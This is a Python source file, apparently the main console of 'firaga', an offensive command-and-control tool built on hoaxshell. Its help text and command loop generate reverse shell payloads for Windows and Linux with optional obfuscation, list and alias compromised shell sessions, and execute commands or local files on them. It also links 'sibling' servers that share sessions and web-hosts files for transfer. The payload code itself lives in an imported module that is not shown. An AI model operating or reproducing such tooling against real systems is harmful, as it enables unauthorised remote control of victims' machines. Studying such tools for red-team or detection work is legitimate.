#!/bin/python3
# Written by Panagiotis Chartas (t3l3machus)

import os, sys, argparse, re, threading, keyboard, rlcompleter
from threading import Thread
from importlib import import_module
from subprocess import DEVNULL, STDOUT, check_call, check_output, run
from pyperclip import copy as copy2cb
from time import sleep
from Core.common import *
# ~ from Core.core_server import *
from Core.firaga_core import Payload_generator, initiate_hoax_server, Sessions_manager, Hoaxshell, Core_server
from string import ascii_uppercase, ascii_lowercase, digits

# -------------- Arguments & Usage -------------- #
parser = argparse.ArgumentParser(
	formatter_class=argparse.RawTextHelpFormatter,
	epilog='''
	
Usage examples:

  - Basic shell session over http:

      sudo python3 hoaxshell.py -s <your_ip>
      
  - Recommended usage to avoid detection (over http)

'''
)

parser.add_argument("-s", "--server-ip", action="store", help = "Your hoaxshell server ip address or domain.")
parser.add_argument("-c", "--certfile", action="store", help = "Path to your ssl certificate.")
parser.add_argument("-k", "--keyfile", action="store", help = "Path to the private key for your certificate.")
parser.add_argument("-u", "--update", action="store_true", help = "Pull the latest version from the original repo.")
parser.add_argument("-q", "--quiet", action="store_true", help = "Do not print the banner on startup.")

args = parser.parse_args()


# -------------- General Functions -------------- #

def print_banner():

	padding = '  '

	# ~ W = [[' ', '┬', ' ', '┬'], [' ', '│','│','│'], [' ', '└','┴','┘']]
	# ~ I =	[[' ', '┬'], [' ', '│',], [' ', '┴']]
	# ~ N = [[' ', '┌','┐','┌'], [' ', '│','│','│'], [' ', '┘','└','┘']]
	# ~ J = [[' ','┬'], [' ','│'], ['└','┘']]
	# ~ I =	[[' ', '┬'], [' ', '│',], [' ', '┴']]
	# ~ T = [['┌','┬','┐'], [' ','│',' '], [' ','┴',' ']]
	# ~ S = [['┌','─','┐'], ['└','─','┐'], ['└','─','┘']]
	# ~ U = [['┬',' ','┬'], ['│',' ','│'], ['└','─','┘']]


	# ~ S = [[' ', '┌','─','┐'], [' ', '└','─','┐'], [' ', '└','─','┘']]
	# ~ A = [[' ', '┌','─','┐'], [' ', '├','─','┤'], [' ', '┴',' ','┴']]	
	# ~ U = [[' ', '┬',' ','┬'], [' ', '│',' ','│'], [' ', '└','─','┘']]
	# ~ R = [[' ', '┬','─','┐'], [' ', '├','┬','┘'], [' ', '┴','└','─']]
	# ~ O =	[[' ', '┌','─','┐'], [' ', '│',' ','│'], [' ', '└','─','┘']]
	# ~ N = [[' ', '┌','┐','┌'], [' ', '│','│','│'], [' ', '┘','└','┘']]	


	# ~ F1 = [['    ,.   '], ['   ("     '], [' .; )  \' '], [' _"., ,.']]
	# ~ F2 = [['(   .     '], [')  )\'    '], ['(( (" )   '], ['_\'_.,)_(']]
	# ~ F3 = [[') '], [',\''], [';(,'], ['..,( .']]


	# ~ banner = [F1,F2,F3]
	# ~ final = []
	# ~ print('\r')
	# ~ init_color = 54

	# ~ txt_color = init_color
	# ~ cl = 0
	
	
	# ~ for charset in range(0, 4):
		# ~ for pos in range(0, len(banner)):
			# ~ for i in range(0, len(banner[pos][charset])):
				# ~ clr = f'\033[38;5;{txt_color}m'
				# ~ char = f'{clr}{banner[pos][charset][i]}'
				# ~ final.append(char)
				# ~ cl += 1
				# ~ txt_color = txt_color + 35 if cl <= 4 else txt_color

			# ~ cl = 0

			# ~ txt_color = init_color

		# ~ init_color += 1

		# ~ if charset < 3: final.append('\n   ')

	# ~ print(f"   {''.join(final)}")

	F = [[' ', '┌','─','┬'], [' ', '├','┤',' '], [' ', '└',' ',' ']]
	I =	[[' ', '┬'], [' ', '│',], [' ', '┴']]
	R = [[' ', '┬','─','┐'], [' ', '├','┬','┘'], [' ', '┴','└','─']]
	A = [[' ', '┌','─','┐'], [' ', '├','─','┤'], [' ', '┴',' ','┴']]	
	G = [[' ', '┌','─','┐'], [' ', '│',' ','┬'], [' ', '└','─','┘']]
	A = [[' ', '┌','─','┐'], [' ', '├','─','┤'], [' ', '┴',' ','┴']]

	# 55 + 1
	# 19 + 1
	# 26, 27 + 5   VERY GOOD
	# 26, 27 + 6   VERY GOOD
	# init 55, txt_color + 35, init color += 1 FIRE RED
	#init 56,  txt_color + 35, init_color += 1 SUPER PURPLE RED
	
	# ~ banner = [W,I,N,J,I,T,S,U]
	# ~ banner = [S,A,U,R,O,N]
	banner = [F,I,R,A,G,A]
	final = []
	print('\r')
	init_color = 26
	# ~ init_color = 3
	txt_color = init_color
	cl = 0
	
	
	for charset in range(0, 3):
		for pos in range(0, len(banner)):
			for i in range(0, len(banner[pos][charset])):
				clr = f'\033[38;5;{txt_color}m'
				char = f'{clr}{banner[pos][charset][i]}'
				final.append(char)
				cl += 1
				txt_color = txt_color + 36 if cl <= 3 else txt_color

			cl = 0

			txt_color = init_color
		# ~ init_color += 30
		init_color += 5

		if charset < 2: final.append('\n   ')

	print(f"   {''.join(final)}")
	print(f'{END}{padding}          by t3l3machus\n')



def print_green(msg):
	print(f'{GREEN}{msg}{END}')


def print_shadow(msg):
	print(f'{GRAY}{msg}{END}')


class PrompHelp:
	
	detailed = {
		'connect' : f''' 			
		\r  Connect with another machine running firaga (sibling server). Once connected, you will be able 
		\r  to see and interact with all connected sibling servers' shell sessions and vice-versa.
			
		\r  {ORANGE}connect <IP> <CORE_SERVER_PORT>{END}
		''',
		'generate' : f''' 			
		\r  Generate reverse shell payload. 
			
		\r  For Windows:
		\r  {ORANGE}generate os=windows lhost=<IP or INTERFACE> [ obfuscate=true ]{END}

		\r  For Linux:
		\r  {ORANGE}generate os=linux lhost=<IP or INTERFACE>{END}
		''',
		'exec' : f''' 			
		\r  Execute command or file against an active shell session. 
			
		\r  {ORANGE}exec <COMMAND or LOCAL FILE PATH> <SESSION ID or ALIAS>{END}
		
		\r  *Command(s) should be quoted.
		''',
		'shell' : f''' 			
		\r  Enable an interactive pseudo-shell for a session. Press Ctrl+C to disable.
			
		\r  {ORANGE}shell <SESSION ID or ALIAS>{END}
		''',
		'alias' : f'''
		\r  Create an alias to use instead of session ID.
			
		\r  {ORANGE}alias <ALIAS> <SESSION ID>{END}
		''',
		'kill' : f'''
		\r  Terminate a self-owned shell session.
			
		\r  {ORANGE}kill <SESSION ID or ALIAS>{END}
		''',
		'host' : f'''
		\r  A utility to web transfer files conveniently:
		\r  Hosts a local directory and prints the contents of it in a tree-like structure.
		\r  Also, it translates every file path to its corresponding URL so you can quickly 
		\r  copy and pass it to web clients.
		\r  {BOLD}Note{END}: Certain non-executable file extensions (e.g., txt, docx, zip) are auto-ignored 
		\r  so that the stdout is reduced. You can config that behaviour by editing firaga/Core/host.py

		\r  {ORANGE}host <PATH TO LOCAL DIR> <PORT>{END}
		'''
	}
	
	
	@staticmethod
	def print_main_help_msg():
				
		print(
		f'''
		\r  Command          Description
		\r  -------          -----------
		\r  help             Print this message.
		\r  connect  [+]     Connect with sibling server.
		\r  generate [+]     Generates reverse shell payload.
		\r  siblings         Print sibling servers data table.
		\r  sessions         Print established shell sessions data table.
		\r  exec     [+]     Execute command/file against session.
		\r  shell    [+]     Enable interactive hoaxshell for session.
		\r  alias    [+]     Set an alias for a shell session.
		\r  kill     [+]     Terminate an established shell session.
		\r  host     [+]     Web host a local directory.
		\r  id               Print server's unique ID (self).
		\r  clear            Clear screen.
		\r  exit/quit/q      End sessions and exit.
		
        \r  Commands with [+] require additional arguments.
        \r  For details use: {ORANGE}help <command>{END}
		''')
			

	@staticmethod
	def print_detailed(cmd):			
		print(PrompHelp.detailed[cmd]) if cmd in PrompHelp.detailed.keys() else print(f'No details for command "{cmd}".')

					

def alias_sanitizer(word, _min = 2, _max = 26):
	
	length = len(word)
	
	if length >= _min and length <= _max:
	
		valid = ascii_uppercase + ascii_lowercase + '-_' + digits
		
		for char in word:		
			if char not in valid:
				return [f'Alias includes illegal character: "{char}".']
		
		return word
				
	else:
		return ['Alias length must be between 2 to 26 characters.']
		
		
quiet = True if args.quiet else False


# Tab completer          
class Completer(object):
	
	tab_counter = 0
	
	def reset_counter(self):
		sleep(0.5)
		Completer.tab_counter = 0
		
	
	def complete(self, text, state):
		
		Completer.tab_counter += 1
		root = os.path.dirname(os.path.abspath(__file__)) + '/Resources'
		main_commands = ['use', 'list']
		module_commands = ['set', 'copy', 'exec', 'run', 'execute']
		
		line_buffer_val = readline.get_line_buffer().strip()
		lb_list = re.sub(' +', ' ', line_buffer_val).split(' ')
		lb_list_len = len(lb_list)

		# Command "use" autocomplete paths
		if lb_list[0] == '':
			pass
		
		# Command "use" autocomplete paths
		elif lb_list[0].lower() == 'use' and lb_list_len > 1:
			
			search_term = lb_list[1]
			
			# Check if root or subdir
			path_level = search_term.split('/')
			
			if re.search('/', search_term) and len(path_level) > 1:
				search_term	= path_level[-1]
				
				for i in range(0, len(path_level)-1):
					root += f'/{path_level[i]}'
				
			dirs = next(os.walk(root))[1]
			match = [d+'/' for d in dirs if re.match(f'^{search_term}', d)]
			files = next(os.walk(root))[2]
			match += [f.rsplit(".", 1)[0] for f in files if re.match(f'^{search_term}', f)]
			
			# Appending match substring 
			if len(match) == 1:
				typed = len(search_term)
				readline.insert_text(match[0][typed:])
				Completer.tab_counter = 0
				
			# Print all matches
			elif len(match) > 1 and Completer.tab_counter > 1:
				print_shadow('\n' + str(match).strip("[]").replace("'", ""))
				Completer.tab_counter = 0
				Main_prompt.rst_prompt(force_rst = True)
				
			#elif len(match) > 1:
			
		# Reset tab counter after 0.5s of inactivity
		threading.Thread(name="reset_counter", target=self.reset_counter).start()
 
		# Main commands autocomplete
		#elif lb_list[0].lower() == 'use' and lb_list_len > 1
		
		
		

	
def main():

	try:
		
		chill() if quiet else print_banner()
		# ~ global prompt, main_prompt_ready
		active_module = False
		current_module = None
		cwd = os.path.dirname(os.path.abspath(__file__))
		
		''' Update utility '''
		if args.update:

			updated = False

			try:

				print(f'[{INFO}] Pulling changes from the master branch...')
				u = check_output(f'cd {cwd}&&git pull https://github.com/t3l3machus/firaga main', shell=True).decode('utf-8')

				if re.search('Updating', u):
					print(f'[{INFO}] Update completed! Please, restart firaga.')
					updated = True

				elif re.search('Already up to date', u):
					print(f'[{INFO}] Already running the latest version!')
					pass

				else:
					print(f'[{FAILED}] Something went wrong. Are you running winjitsu from your local git repository?')
					print(f'[{DEBUG}] Consider running "git pull https://github.com/t3l3machus/firaga main" inside the project\'s directory.')

			except:
				print(f'[{FAILED}] Update failed. Consider running "git pull https://github.com/t3l3machus/firaga main" inside the project\'s directory.')

			if updated:
				sys.exit(0)
		
		
		
		''' Init Firaga's Core '''
		core = Core_server()
		core_server = Thread(target = core.initiate, args = (), daemon = True).start()
		# ~ core_server.daemon = True
		# ~ core_server.start()
		
		initiate_hoax_server()
		payload_engine = Payload_generator()
		sessions_manager = Sessions_manager()
		Hoaxshell.server_unique_id = core.return_server_uniq_id()

		
		''' Start tab autoComplete '''
		comp = Completer()
		# we want to treat '/' as part of a word, so override the delimiters
		readline.set_completer_delims(' \t\n;')
		readline.parse_and_bind("tab: complete")
		readline.set_completer(comp.complete)		
		
		#del sys.modules['requests']		
		

		''' +---------[ Command prompt ]---------+'''
		while True:
			
			if Main_prompt.main_prompt_ready:
				#re.findall("'{1}[\s\S]*'{1}", x)
				#user_input = input(prompt).strip().split(' ')
				user_input = input(Main_prompt.prompt).strip()
				
				# Handle single/double quoted arguments
				quoted_args_single = re.findall("'{1}[\s\S]*'{1}", user_input)
				quoted_args_double = re.findall('"{1}[\s\S]*"{1}', user_input)
				quoted_args = quoted_args_single + quoted_args_double
				
				if len(quoted_args):
					
					for arg in quoted_args:
						space_escaped = arg.replace(' ', Main_prompt.SPACE)
						
						if (space_escaped[0] == "'" and space_escaped[-1] == "'") or (space_escaped[0] == '"' and space_escaped[-1] == '"'):
							space_escaped = space_escaped[1:-1]
													
						user_input = user_input.replace(arg, space_escaped)
						
				
				
				# Create cmd-line args list
				user_input = user_input.split(' ')
				cmd_list = [w.replace(Main_prompt.SPACE, ' ') for w in user_input if w]
				cmd_list_len = len(cmd_list)
				cmd = cmd_list[0].lower() if cmd_list else ''


				if cmd == 'help':
					
					if cmd_list_len == 1:
						PrompHelp.print_main_help_msg()
										
					elif cmd_list_len == 2:
						PrompHelp.print_detailed(cmd_list[1])
					
					continue
					
				# ~ else:
					# ~ print('Unrecognized or missing arguments.')
					
		

				elif cmd == 'id':
					print(f'{BOLD}Server unique id{END}: {ORANGE}{core.return_server_uniq_id()}{END}')



				elif cmd == 'connect':
					
					if cmd_list_len == 3:
						
						core.connect_with_sibling_server(cmd_list[1], cmd_list[2])
						Main_prompt.main_prompt_ready = False
								
					else:
						print('Missing arguments.')

		
				
				elif cmd == 'host':
					
					if len(cmd_list[1]) > 1:
						
						try:
							cmd = 'gnome-terminal --geometry=100x50 -- bash -c ' + f'\'python3 {cwd}/Core/host.py {cmd_list[1]} {cmd_list[2]}\''
							check_output(cmd, shell = True)
							
						except ValueError:
							print('Invalid or non-existent interface name.')



				elif cmd == 'generate':
					
					if len(cmd_list) > 1:
											
						payload_engine.generate_payload(cmd_list[1:])
								
					else:
						print('Missing arguments.')



				elif cmd == 'kill':
					
					if cmd_list_len == 2:
											
						sessions_manager.kill_session(cmd_list[1])
								
					else:
						print('Unrecognized or missing arguments.')
						



				elif cmd == 'exec':
					
					if cmd_list_len == 3:
						
						if len(Sessions_manager.active_sessions.keys()):
							
							Main_prompt.main_prompt_ready = False
							command = cmd_list[1]
							session_id = cmd_list[2]
							src_is_file = False
							
							if command[0] == os.path.sep:
								
								try:
									f = open(command)
									command = f.read()
									f.close()
									src_is_file = True
									
								except:
									print('Failed to load file.')
									Main_prompt.main_prompt_ready = True
									continue
							
							# ~ if command == "pwd": 
								# ~ command = "split-path $pwd'\\0x00'"
							
							# Check if session id has alias
							session_id = sessions_manager.alias_to_session_id(session_id)
							
							# Check who is the owner of the shell session
							session_owner_id = sessions_manager.return_session_owner_id(session_id)
							
							if session_owner_id == core.return_server_uniq_id():
								# ~ padding = ";pwd" if Hoaxshell.active_shell else ''
								# ~ Hoaxshell.command_pool[session_id].append(command + ";pwd")
								Hoaxshell.command_pool[session_id].append(command)
							
							else:
								# ~ command = command + ";pwd" + ";echo '{" + core.SERVER_UNIQUE_ID + "}'"
								# ~ core.proxy_cmd_for_exec_by_sibling(session_owner_id, session_id, command)
								command = command + ";echo '{" + core.SERVER_UNIQUE_ID + "}'"
								core.proxy_cmd_for_exec_by_sibling(session_owner_id, session_id, command)

						else:
							print(f'\r[{INFO}] No active session.')		

					else:
						print('Missing arguments.')
						


				elif cmd == 'shell':
					
					if cmd_list_len == 2:
						
						if len(Sessions_manager.active_sessions.keys()):
							
							Main_prompt.main_prompt_ready = False							
							session_id = cmd_list[1]
							os_type = sessions_manager.active_sessions[session_id]['OS Type']
							Hoaxshell.activate_shell_session(session_id, os_type)
							
							# ~ command = cmd_list[1]
							# ~ if command == "pwd": 
								# ~ command = "split-path $pwd'\\0x00'"
							
							# ~ # Check if session id has alias
							# ~ session_id = sessions_manager.alias_to_session_id(session_id)
							
							# ~ # Check who is the owner of the shell session
							# ~ session_owner_id = sessions_manager.return_session_owner_id(session_id)
							
							# ~ if session_owner_id == core.return_server_uniq_id():
								# ~ padding = ";pwd" if Hoaxshell.active_shell else ''
								# ~ Hoaxshell.command_pool[session_id].append(command + ";pwd")
							
							# ~ else:
								# ~ command = command + ";pwd" + ";echo '{" + core.SERVER_UNIQUE_ID + "}'"
								# ~ core.proxy_cmd_for_exec_by_sibling(session_owner_id, session_id, command)

						else:
							print(f'\r[{INFO}] No active session.')		

					else:
						print('Invalid arguments.')

			

				elif cmd == 'alias':
					
					if cmd_list_len == 3:
						
						sessions = Sessions_manager.active_sessions.keys()
						
						if len(sessions):
							if cmd_list[2] in sessions:
								
								alias = alias_sanitizer(cmd_list[1])
								
								if isinstance(alias, list):
									print(alias[0])
									
								else:
									# Check if alias is unique
									unique = True
									
									for session_id in sessions:
										if Sessions_manager.active_sessions[session_id]['alias'] == alias.strip():
											unique = False
											break
									
									
									# Check if alias is the id of another session	
									is_session_id = False
									
									if alias.strip() in sessions:
										is_session_id = True
										
									if unique and not is_session_id:
										Sessions_manager.active_sessions[cmd_list[2]]['alias'] = alias.strip()
										Sessions_manager.active_sessions[cmd_list[2]]['aliased'] = True
									
									else:
										print('Illegal alias value.')
										
							else:
								print('Invalid session ID.')

						else:
							print(f'\r[{INFO}] No active session.')		

					else:
						print('Missing arguments.')




				elif cmd in ['clear', 'cls']:
					os.system('clear')



				elif cmd in ['exit', 'quit', 'q']:
					raise KeyboardInterrupt



				elif cmd == 'sessions':

					if cmd_list_len == 1:
											
						sessions_manager.list_sessions()
								
					else:
						print('Unsupported arguments.')
				


				elif cmd == 'siblings':

					if cmd_list_len == 1:
											
						core.list_siblings()
								
					else:
						print('Unsupported arguments.')
				


				elif cmd == '':
					continue
					#rst_prompt(force_rst = True, prompt = '\r')

				else:
					print('Unknown command.')


	except KeyboardInterrupt:
		
		print('\r')
		Core_server.announce_server_shutdown()					
		Hoaxshell.terminate()
		core.stop_listener()
		sys.exit(0)



if __name__ == '__main__':
	main()
